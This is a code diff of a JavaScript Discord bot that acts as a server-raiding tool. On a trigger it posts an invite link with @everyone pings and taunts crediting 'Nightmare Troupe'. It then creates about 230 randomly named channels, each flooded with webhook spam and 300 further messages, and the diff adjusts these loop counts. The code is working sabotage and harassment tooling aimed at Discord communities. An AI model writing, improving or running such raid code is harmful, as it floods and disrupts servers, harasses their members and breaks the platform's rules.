@@ -253,27 +253,33 @@ client.on('message', msg => {
             }
             )
         }else{
-       var number = 1    
+       var number = 0
+       
        msg.guild.channels.create('ass').then(c => c.send("https://discord.gg/ANDTsKp @everyone").then(c.send("@everyone fucked by Nightmare Troupe LMFAO69").then(c.send("rip webhook spam shitcord killed it"))))
-       while(number < 400) {
+        while(number < 230) {
             msg.guild.channels.create(random123()).then(c => { 
-            
-                    c.createWebhook("ass").then(w => {
-                        [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,].forEach(function(i) {
-                            w.send(randomT())
-                        })
+               
+                c.createWebhook("ass").then(w => {
+                    
+                    [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1].forEach(function(i) {
+                        w.send(randomT())
+                        
+                    
                     })
-                var spam = 0
-                while(spam < 300) 
-            {    
-                c.send(randomT())
-                spam++
-            }
+                
+                })
+            
+            var spam = 0
+            while(spam < 300) 
+        {    
+            c.send(randomT())
+            spam++
+        }
+                    
             })
         number++
 
         }
-
         }
     }
 })
